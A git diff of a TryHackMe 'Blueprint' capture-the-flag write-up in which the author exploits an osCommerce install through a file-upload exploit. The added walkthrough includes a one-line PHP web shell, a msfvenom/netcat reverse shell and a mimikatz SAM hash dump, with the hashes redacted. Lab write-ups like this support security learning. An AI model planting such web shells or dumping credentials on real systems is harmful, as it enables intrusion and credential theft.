@@ -98,11 +98,11 @@ Nmap done: 1 IP address (1 host up) scanned in 995.72 seconds
 
 The first thing I did was go to the websites on port 80 and 443 to see what is going on there. I got the following result:
 
-![](../../.gitbook/assets/image%20%28123%29.png)
+![](../../.gitbook/assets/image%20%28126%29.png)
 
 This seemed to be some sort of selling website so I was not sure if this is what I am looking for. Port 443 and 8080 lead me to the same result:
 
-![](../../.gitbook/assets/image%20%28119%29.png)
+![](../../.gitbook/assets/image%20%28122%29.png)
 
 I then ran **gobuster** on the "oscommerce" url and got the following result:
 
@@ -145,7 +145,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 I was looking around the directories and did not find anything significant. A lot of the directories showed me the following page:
 
-![](../../.gitbook/assets/image%20%28121%29.png)
+![](../../.gitbook/assets/image%20%28124%29.png)
 
 I then viewed this [write-up](https://www.cybersecpadawan.com/2020/05/tryhackme-blueprint-exploitation-no.html), and realized that my search was missing the "Install" directory. I then ran a search using [feroxbuster,](https://github.com/epi052/feroxbuster) and I got the result so much quicker:
 
@@ -177,11 +177,11 @@ I then viewed this [write-up](https://www.cybersecpadawan.com/2020/05/tryhackme-
 
 Here, I then saw the "Install" directory. This page was still the same as before:
 
-![](../../.gitbook/assets/image%20%28120%29.png)
+![](../../.gitbook/assets/image%20%28123%29.png)
 
 I then saw the same [write-up](https://www.cybersecpadawan.com/2020/05/tryhackme-blueprint-exploitation-no.html), and noticed that they used **searchsploit** in order to search for a vulnerability for the machine. I then got this result:
 
-![](../../.gitbook/assets/image%20%28122%29.png)
+![](../../.gitbook/assets/image%20%28125%29.png)
 
 I wanted to try out the **Arbitrary File Upload** first. To get this in my current directory, I ran the following commands:
 
@@ -192,23 +192,139 @@ cp /usr/share/exploitdb/exploits/php/webapps/43191.py . #copies it to the local 
 
 I ran the code just by itself to see what parameters it was looking for:
 
-![](../../.gitbook/assets/image%20%28126%29.png)
+![](../../.gitbook/assets/image%20%28132%29.png)
 
 I noticed that I needed a target \(at least\), authentication, and file. I tried to enter in just the target argument. I then realized I did not have the username and password for the authentication. I then went back to the install page in the catalog directory:
 
-![](../../.gitbook/assets/image%20%28125%29.png)
+![](../../.gitbook/assets/image%20%28130%29.png)
 
 I then clicked on the **start** button to see what it did. I entered root for the username and the Database Name and then press continue:
 
-![](../../.gitbook/assets/image%20%28118%29.png)
+![](../../.gitbook/assets/image%20%28120%29.png)
 
 I tried **admin** for the Username, and I ran into an error. I then tried **root** and it worked! I then set the Online Store Settings like:
 
-![](../../.gitbook/assets/image%20%28117%29.png)
+![](../../.gitbook/assets/image%20%28118%29.png)
 
 All the previous setup for the commerce site was based off of [the same write-up](https://www.cybersecpadawan.com/2020/05/tryhackme-blueprint-exploitation-no.html). I then got the following page:
 
-![](../../.gitbook/assets/image%20%28124%29.png)
+![](../../.gitbook/assets/image%20%28129%29.png)
 
-I was then lost about where to go from here. I then 
+I was then lost about where to go from here. I then looked at the write-up and learned that I had to upload a basic PHP file:
+
+```php
+<?php passthru($_GET['cmd']);
+?>
+```
+
+I then ran the python file with the modules:
+
+![](../../.gitbook/assets/image%20%28121%29.png)
+
+I then realized I had made a mistake. In my python command, I had added a "/" in the URL when I was not supposed to do so. After that, I was successful:
+
+![](../../.gitbook/assets/image%20%28127%29.png)
+
+I will be honest, at this part, I had to look back at the write-up because I was out of the TryHackMe game for a while, and was not sure what to do. The next item I had to do was get a reverse shell on the machine.  In order to do this, I would have to use **msfvenom** in order to do so:
+
+![](../../.gitbook/assets/image%20%28131%29.png)
+
+Now I can run a **netcat** listener and then go to the webpage with the executable on it:
+
+![](../../.gitbook/assets/image%20%28133%29.png)
+
+I then ran systeminfo in order to gain information about the system. I then got the following result:
+
+```php
+Host Name:                 BLUEPRINT
+OS Name:                   Microsoft Windows 7 Home Basic 
+OS Version:                6.1.7601 Service Pack 1 Build 7601
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00346-OEM-8992752-50005
+Original Install Date:     1/15/2017, 6:48:59 AM
+System Boot Time:          7/11/2021, 10:19:59 PM
+System Manufacturer:       Xen
+System Model:              HVM domU
+System Type:               X86-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: x64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
+BIOS Version:              Xen 4.2.amazon, 8/24/2006
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
+Total Physical Memory:     2,048 MB
+Available Physical Memory: 1,317 MB
+Virtual Memory: Max Size:  4,095 MB
+Virtual Memory: Available: 3,112 MB
+Virtual Memory: In Use:    983 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 3 Hotfix(s) Installed.
+                           [01]: KB2534111
+                           [02]: KB976902
+                           [03]: KB4012215
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Citrix PV Ethernet Adapter
+                                 Connection Name: Local Area Connection 3
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.10.0.1
+                                 IP address(es)
+                                 [01]: 10.10.21.26
+                                 [02]: fe80::1565:9838:2ad3:4231
+```
+
+I then had to upload mimikatz to the Windows machine. I had to first find the location of mikikatz on the machine:
+
+![](../../.gitbook/assets/image%20%28117%29.png)
+
+I was looking for the **mimikatz.exe** file. I then had to upload the file to the machine:
+
+![](../../.gitbook/assets/image%20%28119%29.png)
+
+I was then able to access **mimikatz** on the machine:
+
+![](../../.gitbook/assets/image%20%28134%29.png)
+
+I got the following output when I ran **lsadump::sam**:
+
+```php
+mimikatz # lsadump::sam
+Domain : BLUEPRINT
+SysKey : <REDACTED>
+Local SID : S-1-5-21-3130159037-241736515-3168549210
+
+SAMKey : <REDACTED>
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: <REDACTED>
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000003e8 (1000)
+User : Lab
+  Hash NTLM: <REDACTED>
+
+```
+
+Using [crackstation](https://crackstation.net/), I was able to crack one of the two hashes:
+
+![](../../.gitbook/assets/image%20%28128%29.png)
+
+This was the answer to one of the questions on the machine. The second answer was the root.txt file "password". I got to this through changing directory by "cd-ing" into the directory and then running the following command:
+
+```php
+C:\Users\Administrator\Desktop>type root.txt.txt
+```
+
+I then solved the room!
 
